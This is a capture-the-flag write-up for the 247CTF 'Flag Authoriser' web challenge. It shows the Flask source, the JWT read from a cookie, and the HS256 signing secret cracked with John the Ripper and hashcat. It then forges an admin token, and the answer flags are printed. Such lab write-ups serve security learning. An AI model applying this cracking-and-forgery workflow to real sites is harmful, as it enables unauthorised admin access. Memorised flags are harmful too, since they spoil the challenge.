# Web: Flag Authoriser

## Previous Flag
```
247CTF{76fbce3909b3129536bb396fea3a9879}
```

## Goal
Can you forge a new identity to upgrade your access from an anonymous user to an admin?

## What I learned
```
JWT (JSON Web Tokens) Vulnerabilities
```

## Side Quest: Note: Don't do this just use JWT from cookie page
```
AsianHacker-picoctf@webshell:~$ vi bashScript.sh 
AsianHacker-picoctf@webshell:~$ chmod u+x bashScript.sh 
AsianHacker-picoctf@webshell:~$ cat bashScript.sh 
#!/usr/bin/bash

TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiYzY3OWRiZDAtNjM2NS00NTUxLThmY2YtZWNjNzQxOTliMDZmIiwianRpIjoiNTZmYTllMzYtZTA0Yy00ZWZjLTg5MDctMjg5YTIwM2IwOTdjIiwiZXhwIjoxNzYwMDQ4MTM2LCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc2MDA0NzIzNiwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc2MDA0NzIzNiwiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.k8WJRPrLSB5JvSQ8mmWxFG7FdZmICPjTu1CerzHLvWw'
A=$(echo "$TOKEN" | cut -d. -f1)
B=$(echo "$TOKEN" | cut -d. -f2)
C=$(echo "$TOKEN" | cut -d. -f3)
echo "HEADER   : $A"
echo "PAYLOAD  : $B"
echo "SIGNATURE: $C"
AsianHacker-picoctf@webshell:~$ ./bashScript.sh 
HEADER   : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
PAYLOAD  : eyJjc3JmIjoiYzY3OWRiZDAtNjM2NS00NTUxLThmY2YtZWNjNzQxOTliMDZmIiwianRpIjoiNTZmYTllMzYtZTA0Yy00ZWZjLTg5MDctMjg5YTIwM2IwOTdjIiwiZXhwIjoxNzYwMDQ4MTM2LCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc2MDA0NzIzNiwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc2MDA0NzIzNiwiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ
SIGNATURE: k8WJRPrLSB5JvSQ8mmWxFG7FdZmICPjTu1CerzHLvWw

# Convert signature (base64url) → raw bytes → hex
AsianHacker-picoctf@webshell:~$ cat bashScript.sh 
#!/usr/bin/bash

SIG="k8WJRPrLSB5JvSQ8mmWxFG7FdZmICPjTu1CerzHLvWw"
python3 - <<PY
import base64,sys
s = "$SIG"
s += '=' * (-len(s) % 4)
b = base64.urlsafe_b64decode(s)
print(b.hex())
PY
AsianHacker-picoctf@webshell:~$ ./bashScript.sh 
93c58944facb481e49bd243c9a65b1146ec575998808f8d3bb509eaf31cbbd6c

https://cyberchef.io/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)To_Hex('None',0)&input=azhXSlJQckxTQjVKdlNROG1tV3hGRzdGZFptSUNQalR1MUNlcnpITHZXdw
```

## Solution
```
START CHALLENGE

https://c54159fad94e6cf1.247ctf.com/

from flask import Flask, redirect, url_for, make_response, render_template, flash
from flask_jwt_extended import JWTManager, create_access_token, jwt_optional, get_jwt_identity
from secret import secret, admin_flag, jwt_secret

app = Flask(__name__)
cookie = "access_token_cookie"

app.config['SECRET_KEY'] = secret
app.config['JWT_SECRET_KEY'] = jwt_secret
app.config['JWT_TOKEN_LOCATION'] = ['cookies']
app.config['DEBUG'] = False

jwt = JWTManager(app)

def redirect_to_flag(msg):
    flash('%s' % msg, 'danger')
    return redirect(url_for('flag', _external=True))

@jwt.expired_token_loader
def my_expired_token_callback():
    return redirect_to_flag('Token expired')

@jwt.invalid_token_loader
def my_invalid_token_callback(callback):
    return redirect_to_flag(callback)

@jwt_optional
def get_flag():
    if get_jwt_identity() == 'admin':
        return admin_flag

@app.route('/flag')
def flag():
    response = make_response(render_template('main.html', flag=get_flag()))
    response.set_cookie(cookie, create_access_token(identity='anonymous'))
    return response

@app.route('/')
def source():
    return "
%s
" % open(__file__).read()

if __name__ == "__main__":
    app.run()

# Get JWT TOKEN
Browser > Inspect > Application > Cookies: access_token_cookie
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiYzY3OWRiZDAtNjM2NS00NTUxLThmY2YtZWNjNzQxOTliMDZmIiwianRpIjoiNTZmYTllMzYtZTA0Yy00ZWZjLTg5MDctMjg5YTIwM2IwOTdjIiwiZXhwIjoxNzYwMDQ4MTM2LCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc2MDA0NzIzNiwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc2MDA0NzIzNiwiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.k8WJRPrLSB5JvSQ8mmWxFG7FdZmICPjTu1CerzHLvWw 👀

# Note: Cookie will be different because open 2 different places
# curl will be harder to handle do in browser or use Burp Suite
AsianHacker-picoctf@webshell:~$ curl -i https://c54159fad94e6cf1.247ctf.com/flag ⌨️
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 09 Oct 2025 22:03:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 863
Connection: keep-alive
Set-Cookie: access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiMWU3MWUxZDQtNzExOC00OTM1LWFjZDktYzZlMGNhYzYzMWEwIiwianRpIjoiYjhmMmJhNWUtY2M2ZC00ODVmLTg5ZTAtMzQ3OWYwOWY0NzE1IiwiZXhwIjoxNzYwMDQ4MzAwLCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc2MDA0NzQwMCwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc2MDA0NzQwMCwiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.KbYLbOc9YunMfVIq3pmJr5yHFEPOgSsqxD-JsSCpho8; Path=/ 👀

<!DOCTYPE html>
<html lang="en">
<head>
  <title>JWT flag authoriser</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>
<body>
  <div class="d-flex justify-content-center align-items-center min-vh-100">
    <div class="container text-center">
      <div class="row">
        <div class="col">
          <div class="card o-hidden border-0 shadow-lg my-5">
            <div class="card-body p-0">
              <div class="p-3">

              <div class="text-center">
                Welcome to the JWT flag authoriser!
                
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
 </div>
</body>
</html>

# No Need to Decode JWT TOKEN
# If do CyberChef get wierd output but with a JWT Decoder just get signature error
Wrong: https://cyberchef.io/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmpjM0ptSWpvaVl6WTNPV1JpWkRBdE5qTTJOUzAwTlRVeExUaG1ZMll0WldOak56UXhPVGxpTURabUlpd2lhblJwSWpvaU5UWm1ZVGxsTXpZdFpUQTBZeTAwWldaakxUZzVNRGN0TWpnNVlUSXdNMkl3T1Rkaklpd2laWGh3SWpveE56WXdNRFE0TVRNMkxDSm1jbVZ6YUNJNlptRnNjMlVzSW1saGRDSTZNVGMyTURBME56SXpOaXdpZEhsd1pTSTZJbUZqWTJWemN5SXNJbTVpWmlJNk1UYzJNREEwTnpJek5pd2lhV1JsYm5ScGRIa2lPaUpoYm05dWVXMXZkWE1pZlEuazhXSlJQckxTQjVKdlNROG1tV3hGRzdGZFptSUNQalR1MUNlcnpITHZXdw ⚠️

https://www.jwt.io/
Decoded Header
{
  "alg": "HS256",
  "typ": "JWT"
}

Decoded Payload
{
  "csrf": "c679dbd0-6365-4551-8fcf-ecc74199b06f",
  "jti": "56fa9e36-e04c-4efc-8907-289a203b097c",
  "exp": 1760048136,
  "fresh": false,
  "iat": 1760047236,
  "type": "access",
  "nbf": 1760047236,
  "identity": "anonymous"
}

# change identity and need break secret key w/ John the Ripper
┌──(asianhacker㉿kali)-[/home/asianhacker]
└─PS> cat ./jwt.txt ⌨️
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiYzY3OWRiZDAtNjM2NS00NTUxLThmY2YtZWNjNzQxOTliMDZmIiwianRpIjoiNTZmYTllMzYtZTA0Yy00ZWZjLTg5MDctMjg5YTIwM2IwOTdjIiwiZXhwIjoxNzYwMDQ4MTM2LCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc2MDA0NzIzNiwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc2MDA0NzIzNiwiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.k8WJRPrLSB5JvSQ8mmWxFG7FdZmICPjTu1CerzHLvWw

┌──(asianhacker㉿kali)-[/home/asianhacker]
└─PS> john ./jwt.txt --wordlist-rockyou.txt --format=HMAC-SHA256 ⌨️
Created directory: /home/asianhacker/.john
Unknown option: "--wordlist-rockyou.txt"

# Note: Only do 1 time since uknown option bc no rockyou.txt
┌──(asianhacker㉿kali)-[/home/asianhacker]
└─PS> gunzip /usr/share/wordlists/rockyou.txt.gz ⌨️

┌──(asianhacker㉿kali)-[/home/asianhacker]
└─PS> john ./jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 ⌨️
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 3 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
wepwn247         (?) 👀
1g 0:00:00:00 DONE (2025-10-09 20:29) 1.190g/s 3313Kp/s 3313Kc/s 3313KC/s westham3790..wenselb
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(asianhacker㉿kali)-[/home/asianhacker]
└─PS> john --show ./jwt.txt ⌨️                                                       
?:wepwn247 👀

1 password hash cracked, 0 left

┌──(asianhacker㉿kali)-[/home/asianhacker]
└─PS> hashcat -m 16500 ./jwt.txt /usr/share/wordlists/rockyou.txt ⌨️                   
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, 1470/2941 MB (512 MB allocatable), 3MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (2530 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiYzY3OWRiZDAtNjM2NS00NTUxLThmY2YtZWNjNzQxOTliMDZmIiwianRpIjoiNTZmYTllMzYtZTA0Yy00ZWZjLTg5MDctMjg5YTIwM2IwOTdjIiwiZXhwIjoxNzYwMDQ4MTM2LCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc2MDA0NzIzNiwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc2MDA0NzIzNiwiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.k8WJRPrLSB5JvSQ8mmWxFG7FdZmICPjTu1CerzHLvWw:wepwn247 👀
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiYz...zHLvWw
Time.Started.....: Thu Oct  9 20:30:12 2025 (2 secs)
Time.Estimated...: Thu Oct  9 20:30:14 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1119.2 kH/s (2.13ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2783232/14344385 (19.40%)
Rejected.........: 0/2783232 (0.00%)
Restore.Point....: 2780160/14344385 (19.38%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: werulenow -> wenses66
Hardware.Mon.#01.: Util: 86%

Started: Thu Oct  9 20:30:11 2025
Stopped: Thu Oct  9 20:30:16 2025

┌──(asianhacker㉿kali)-[/home/asianhacker]
└─PS> hashcat --show -m 16500 ./jwt.txt                                                   
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiYzY3OWRiZDAtNjM2NS00NTUxLThmY2YtZWNjNzQxOTliMDZmIiwianRpIjoiNTZmYTllMzYtZTA0Yy00ZWZjLTg5MDctMjg5YTIwM2IwOTdjIiwiZXhwIjoxNzYwMDQ4MTM2LCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc2MDA0NzIzNiwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc2MDA0NzIzNiwiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.k8WJRPrLSB5JvSQ8mmWxFG7FdZmICPjTu1CerzHLvWw:wepwn247 👀

# Secret Key known use Encoder Site: https://www.jwt.io/
# Change identity to admin
Header: Algorithm & Token Type
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload: Data
{
  "csrf": "494839cd-6764-4a5e-b069-bf6b0a068390",
  "jti": "ff007faa-6694-477c-9fa2-6c02281770a2",
  "exp": 1760056419,
  "fresh": false,
  "iat": 1760055519,
  "type": "access",
  "nbf": 1760055519,
  "identity": "admin" 👀
}

Sign JWT: Secret
wepwn247

# Generated new JSON Web Token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiNDk0ODM5Y2QtNjc2NC00YTVlLWIwNjktYmY2YjBhMDY4MzkwIiwianRpIjoiZmYwMDdmYWEtNjY5NC00NzdjLTlmYTItNmMwMjI4MTc3MGEyIiwiZXhwIjoxNzYwMDU2NDE5LCJmcmVzaCI6ZmFsc2UsImlhdCI6MTc2MDA1NTUxOSwidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTc2MDA1NTUxOSwiaWRlbnRpdHkiOiJhZG1pbiJ9.F9MgW6wxJQOtoj-mVNxtCxlKzjzQ3_v1pvADh2Jt4uk 👀

# Browser edit access_token_cookie to new JSON Web Token
# Refresh Browser
Welcome to the JWT flag authoriser!
247CTF{df766362b470d11495214b2f8a4a31b3} 🔐
```

## Flag
247CTF{df766362b470d11495214b2f8a4a31b3}

## Continue
[Continue](../247ctf/WebForgottenFilePointer.md)